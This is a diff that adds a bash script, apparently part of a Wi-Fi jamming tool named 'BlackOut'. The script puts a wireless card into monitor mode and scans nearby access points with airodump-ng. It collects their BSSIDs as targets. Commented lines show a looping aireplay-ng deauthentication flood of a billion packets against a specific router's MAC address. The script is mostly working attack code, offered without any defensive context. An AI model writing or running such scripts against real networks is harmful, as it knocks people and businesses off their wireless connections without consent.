@@ -1,0 +1,24 @@
+#!/bin/bash
+
+bash BlackOutF output
+
+fileName=output
+
+
+##This scans the airwaves for router and hotspot activity.
+##airodump-ng --band abg wlan1 && cat > $output
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng --band abg -w $fileName wlan0
+
+fileName=BSSID
+##collecting of bssid s and reitemizing them for use in BlackOut
+##grep "${bssid}" $output + ".csv" | cut -d, -f"${index}"
+bash BlackOutF csv_collection
+
+##example of new window for scan only works with xfce version of kali
+	##qterminal -e "airodump-ng --band abg wlan1"
+
+
+##examle of window opening to deauth AP only works with xfce version of kali. Use "gnome-terminal -e "bash -c \" and then the commands after in quotes. Follow the command by ";" then "exec bash\""" 
+	##qterminal -e "until aireplay-ng --deauth 1000000000 -a 00:25:00:FF:94:73 wlan1; do aireplay-ng --deauth 1000000000 -a 00:25:00:FF:94:73 wlan1"
